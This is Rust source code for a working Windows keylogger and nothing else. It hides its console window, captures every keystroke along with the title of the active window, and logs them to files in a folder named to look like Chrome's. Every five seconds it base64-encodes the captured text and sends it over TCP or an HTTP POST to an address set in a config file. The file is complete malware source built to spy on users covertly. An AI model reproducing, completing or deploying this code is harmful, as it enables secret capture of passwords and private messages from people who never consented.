use base64;
use device_query::{DeviceQuery, DeviceState, Keycode};
use inputbot::KeybdKey::Numpad0Key;
use std::convert::TryFrom;
use std::fs::OpenOptions;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::mpsc::channel;
use std::sync::Arc;
use std::sync::Mutex;
use std::thread;
use std::time::Duration;
use windows::core::Result;
use windows::core::PWSTR;
use windows::Win32::System::Threading::GetCurrentThreadId;
use windows::Win32::UI::Input::KeyboardAndMouse::ToUnicodeEx;
use windows::Win32::UI::Input::KeyboardAndMouse::{
    GetAsyncKeyState, GetKeyState, GetKeyboardLayout, GetKeyboardState, ToUnicode,
};
use windows::Win32::UI::WindowsAndMessaging::{
    GetForegroundWindow, GetWindowTextW, GetWindowThreadProcessId,
};

// Key represents a single key entered by the user
#[derive(Debug, Clone)]
struct Key {
    keycode: i32,            // The keycode of the key
    char: Option<char>,      // Unicode character of the key
    is_control: bool,        // Is the key a control key (e.g. shift, ctrl, alt, etc.)
    control: Option<String>, // The title of the window that was active when the key was pressed
    window_title: String,    // The title of the window that was active when the key was pressed
}

fn main() {
    unsafe { windows::Win32::System::Console::FreeConsole() };

    let (tx1, rx1) = channel::<Key>();
    let (tx2, rx2) = channel::<Key>();

    let keys1 = Arc::new(Mutex::new(Vec::<Key>::new()));

    // Print all received keys to a file for debugging
    let h2 = thread::spawn(move || {
        let pressed_file = user_file_path("pressed.txt");
        let mut file = OpenOptions::new()
            .create(true)
            .write(true)
            .append(true)
            .open(pressed_file)
            .unwrap();

        for received in rx1 {
            writeln!(file, "{:?}", received).unwrap();
        }
    });

    let h3 = thread::spawn({
        let keys1 = Arc::clone(&keys1);
        move || loop {
            let mut keys_string = String::new();

            {
                let mut keys1 = keys1.lock().unwrap();
                for key in keys1.drain(..) {
                    if let Some(r) = key.char {
                        keys_string.push(r);
                    }
                    if let Some(r) = key.control {
                        keys_string.push_str(&r);
                    }
                }
            }

            if !keys_string.is_empty() {
                write_to_file(&keys_string);
                // send_to_tcp(&keys_string);
                let sent = send_to_http(&keys_string);
                if sent {
                    // keys1.clear();
                }
            }

            thread::sleep(Duration::from_secs(5));
        }
    });

    let keycodes = get_main_key_codes();
    loop {
        let next_key = get_next(&keycodes);

        tx1.send(next_key.clone()).unwrap();
        tx2.send(next_key.clone()).unwrap();

        {
            let mut keys1 = keys1.lock().unwrap();
            keys1.push(next_key.clone());
        }

        // println!("next: {:?}", next_key);
    }
}

// Get TCP address from the ./address.txt file if it exists other wise return the default address
fn get_address() -> String {
    let address_file_name = user_file_path("address.txt");
    let mut address = String::new();
    let mut file = OpenOptions::new()
        .read(true)
        .open(&address_file_name)
        .unwrap_or_else(|_| {
            // println!("No address.txt file found, using default address");
            let mut df = OpenOptions::new()
                .create(true)
                .write(true)
                .open(&address_file_name)
                .unwrap();
            df.write(b"127.0.0.1:4000").unwrap();
            df
        });
    let res = file.read_to_string(&mut address);
    match res {
        Ok(_) => {
            // println!("address.txt file found, using address: {}", address);
            address
        }
        Err(e) => {
            // println!("Error reading address.txt file: {}", e);
            "127.0.0.1:4000".to_string()
        }
    }
}

fn get_next(keycodes: &[i32]) -> Key {
    let mut keyboard_state = [0u8; 256];

    let next = wait_for_next_key(&keycodes);
    // println!("next: {:?}", next);
    let t = unsafe { GetKeyboardState(&mut keyboard_state) };

    let foreground_window = unsafe { GetForegroundWindow() };
    let thread_id = unsafe { GetWindowThreadProcessId(foreground_window, None) };
    let layout = unsafe { GetKeyboardLayout(thread_id) };
    let mut pwszbuff = [0u16; 1]; // Create a buffer
                                  // Use the correct arguments for ToUnicodeEx
    let code = unsafe {
        ToUnicodeEx(
            next as u32, // Use the key code as `wvirtkey`
            0, // `wscancode`, it's usually obtained from a WM_KEYDOWN or WM_KEYUP message.
            &keyboard_state,
            &mut pwszbuff, // Pass the buffer
            0,             // `wflags`, always 0 for this usage
            layout,
        )
    };

    // Add the code to get the window title
    let mut window_title = vec![0u16; 1024]; // Create a buffer for the window title
    let title_length = unsafe { GetWindowTextW(foreground_window, &mut window_title) };
    window_title.resize(title_length as usize, 0); // Resize the vector to fit the title
    let window_title = String::from_utf16(&window_title).unwrap_or_default(); // Convert the title to a String

    let mut key = Key {
        keycode: next,
        char: None,
        is_control: false,
        control: None,
        window_title,
    };

    let code_point: u32 = pwszbuff[0] as u32;
    if let Some(character) = char::from_u32(code_point) {
        if character.is_control() {
            key.is_control = true;
            key.control = win_key_to_string(next);
        } else {
            key.char = Some(character);
        }
    } else {
        key.is_control = true;
    };

    key
}

fn wait_for_next_key(keycodes: &[i32]) -> i32 {
    let mut last_key: Option<i32> = None;
    loop {
        for &key in keycodes.iter() {
            let key_code = unsafe { GetAsyncKeyState(key) };
            if key_code == 0 {
                if let Some(last) = last_key {
                    if last == key {
                        return key;
                    }
                }
                continue;
            }

            // The shift is for only pressed key
            if key_code != -32768 || key_code & (1 << 15) == 0 {
                continue;
            }
            last_key = Some(key);
        }
        thread::sleep(Duration::from_millis(5));
    }
}

// todo to global static
fn get_main_key_codes() -> Vec<i32> {
    let mut keycodes = vec![];
    // Iterate from 0 to 255 inclusive
    for i in 0..=255 {
        if is_known_win_key(i) {
            keycodes.push(i); //todo
        }
    }
    keycodes
}

// Reduced list of known major keys
// https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
fn is_known_win_key(win_key1: i32) -> bool {
    use windows::Win32::UI::Input::KeyboardAndMouse::*;

    let known_keys: Vec<VIRTUAL_KEY> = vec![
        // Mouse buttons
        // VK_LBUTTON, // Left mouse button
        // VK_RBUTTON, // Right mouse button
        // VK_MBUTTON, // Middle mouse button (three-button mouse)
        // Special keys and other buttons
        VK_BACK,    // BACKSPACE key
        VK_TAB,     // TAB key
        VK_RETURN,  // ENTER key
        VK_SHIFT,   // SHIFT key
        VK_CONTROL, // CTRL key
        VK_MENU,    // ALT key
        VK_PAUSE,   // PAUSE key
        VK_CAPITAL, // CAPS LOCK key
        VK_ESCAPE,  // ESC key
        VK_SPACE,   // SPACEBAR
        VK_PRIOR,   // PAGE UP key
        VK_NEXT,    // PAGE DOWN key
        VK_END,     // END key
        VK_HOME,    // HOME key
        VK_LEFT,    // LEFT ARROW key
        VK_UP,      // UP ARROW key
        VK_RIGHT,   // RIGHT ARROW key
        VK_DOWN,    // DOWN ARROW key
        VK_INSERT,  // INS key
        VK_DELETE,  // DEL key
        // Function keys
        VK_F1,  // F1 key
        VK_F2,  // F2 key
        VK_F3,  // F3 key
        VK_F4,  // F4 key
        VK_F5,  // F5 key
        VK_F6,  // F6 key
        VK_F7,  // F7 key
        VK_F8,  // F8 key
        VK_F9,  // F9 key
        VK_F10, // F10 key
        VK_F11, // F11 key
        VK_F12, // F12 key
        // Other keys
        VK_NUMLOCK,    // NUM LOCK key
        VK_SCROLL,     // SCROLL LOCK key
        VK_LSHIFT,     // Left SHIFT key
        VK_RSHIFT,     // Right SHIFT key
        VK_LCONTROL,   // Left CONTROL key
        VK_RCONTROL,   // Right CONTROL key
        VK_LMENU,      // Left ALT key
        VK_RMENU,      // Right ALT key
        VK_OEM_PLUS,   // '+' key
        VK_OEM_COMMA,  // ',' key
        VK_OEM_MINUS,  // '-' key
        VK_OEM_PERIOD, // '.' key
        // Oem keys - todo
        VK_OEM_1,   //
        VK_OEM_2,   //
        VK_OEM_3,   //
        VK_OEM_4,   //
        VK_OEM_6,   //
        VK_OEM_7,   //
        VK_OEM_8,   //
        VK_OEM_102, //
        // Numbers
        VK_NUMPAD0,
        VK_NUMPAD1,
        VK_NUMPAD2,
        VK_NUMPAD3,
        VK_NUMPAD4,
        VK_NUMPAD5,
        VK_NUMPAD6,
        VK_NUMPAD7,
        VK_NUMPAD8,
        VK_NUMPAD9,
        // No available keys
        VK_SNAPSHOT,
        VK_PRINT,
    ];
    let vk = VIRTUAL_KEY(win_key1 as u16);
    let control = known_keys.contains(&vk);
    if control {
        return true;
    }

    let win_key = win_key1 as u8;
    match win_key as char {
        '0'..='9' | 'A'..='Z' => true,
        _ => false,
    }
}

fn win_key_to_string(win_key1: i32) -> Option<String> {
    use windows::Win32::UI::Input::KeyboardAndMouse::*;

    let known_keys: Vec<(VIRTUAL_KEY, &str)> = vec![
        // Mouse buttons
        (VK_LBUTTON, "[l-mouse]"), // Left mouse button
        (VK_RBUTTON, "[r-mouse]"), // Right mouse button
        (VK_MBUTTON, "[m-mouse]"), // Middle mouse button (three-button mouse)
        // Special keys and other buttons
        (VK_BACK, "[back]"),         // BACKSPACE key
        (VK_TAB, "[tab]"),           // TAB key
        (VK_RETURN, "[enter]"),      // ENTER key
        (VK_SHIFT, "[shift]"),       // SHIFT key
        (VK_CONTROL, "[ctrl]"),      // CTRL key
        (VK_MENU, "[alt]"),          // ALT key
        (VK_PAUSE, "[pause]"),       // PAUSE key
        (VK_CAPITAL, "[caps-lock]"), // CAPS LOCK key
        (VK_ESCAPE, "[esc]"),        // ESC key
        (VK_SPACE, "[spacebar]"),    // SPACEBAR
        (VK_PRIOR, "[pg-up]"),       // PAGE UP key
        (VK_NEXT, "[pg-down]"),      // PAGE DOWN key
        (VK_END, "[end]"),           // END key
        (VK_HOME, "[home]"),         // HOME key
        (VK_LEFT, "[left-arrow]"),   // LEFT ARROW key
        (VK_UP, "[up-arrow]"),       // UP ARROW key
        (VK_RIGHT, "[right-arrow]"), // RIGHT ARROW key
        (VK_DOWN, "[down-arrow]"),   // DOWN ARROW key
        (VK_INSERT, "[insert]"),     // INS key
        (VK_DELETE, "[delete]"),     // DEL key
        // Function keys
        (VK_F1, "[f1]"),   // F1 key
        (VK_F2, "[f2]"),   // F2 key
        (VK_F3, "[f3]"),   // F3 key
        (VK_F4, "[f4]"),   // F4 key
        (VK_F5, "[f5]"),   // F5 key
        (VK_F6, "[f6]"),   // F6 key
        (VK_F7, "[f7]"),   // F7 key
        (VK_F8, "[f8]"),   // F8 key
        (VK_F9, "[f9]"),   // F9 key
        (VK_F10, "[f10]"), // F10 key
        (VK_F11, "[f11]"), // F11 key
        (VK_F12, "[f12]"), // F12 key
        // Other keys
        (VK_NUMLOCK, "[num-lock]"),   // NUM LOCK key
        (VK_SCROLL, "[scroll-lock]"), // SCROLL LOCK key
        (VK_LSHIFT, "[l-shift]"),     // Left SHIFT key
        (VK_RSHIFT, "[r-shift]"),     // Right SHIFT key
        (VK_LCONTROL, "[l-ctrl]"),    // Left CONTROL key
        (VK_RCONTROL, "[r-ctrl]"),    // Right CONTROL key
        (VK_LMENU, "[l-menu]"),       // Left ALT key
        (VK_RMENU, "[r-menu]"),       // Right ALT key
        (VK_OEM_PLUS, "[+]"),         // '+' key
        (VK_OEM_COMMA, "[,]"),        // ',' key
        (VK_OEM_MINUS, "[-]"),        // '-' key
        (VK_OEM_PERIOD, "[.]"),       // '.' key
        // No available keys
        (VK_SNAPSHOT, "[snapshot]"),
        (VK_PRINT, "[print]"),
    ];

    // todo: to global static
    let vk = win_key1 as u16;
    for (key, string) in known_keys {
        if key.0 == vk {
            return Some(string.to_string());
        }
    }
    None
}

use directories::UserDirs;
use std::path::PathBuf;

fn user_file_path(filename: &str) -> String {
    let user_dirs = UserDirs::new().expect("Failed to get user directories");
    let mut path = PathBuf::from(user_dirs.home_dir());
    path.push("AppData\\Roaming\\Chrome");
    std::fs::create_dir_all(&path);
    path.push(filename);
    path.to_str().unwrap().to_string()
}

fn send_to_tcp(keys_string: &str) -> bool {
    let keys_base64 = base64::encode(&keys_string);
    let address = get_address();
    match TcpStream::connect(&address) {
        Ok(mut stream) => match writeln!(stream, "{}", keys_base64) {
            Ok(_) => true,
            Err(e) => {
                println!("Failed to write to TCP stream: {}", e);
                false
            }
        },
        Err(e) => {
            println!("Error connecting to server: {}", e);
            false
        }
    }
}

fn send_to_http(keys_string: &str) -> bool {
    let keys_base64 = base64::encode(&keys_string);
    let address = get_address();
    let mut stream = match TcpStream::connect(&address) {
        Ok(s) => s,
        Err(e) => {
            println!("Failed to connect: {}", e);
            return false;
        }
    };

    // Write HTTP request to the stream
    let request = format!(
        "POST / HTTP/1.1\r\n\
        Host: {}\r\n\
        Content-Type: text/plain\r\n\
        Content-Length: {}\r\n\r\n\
        {}",
        &address,
        keys_base64.len(),
        keys_base64
    );

    match stream.write_all(request.as_bytes()) {
        Ok(_) => true,
        Err(e) => {
            println!("Failed to send request: {}", e);
            false
        }
    }
}

fn write_to_file(keys_string: &str) {
    let path = user_file_path("pressed_sentence.txt");
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .append(true)
        .open(path)
        .unwrap();

    let keys_base64 = base64::encode(&keys_string);
    writeln!(file, "text: {}", keys_string);
    writeln!(file, "base64: {}", keys_base64);
    writeln!(file, "=======================================");
}
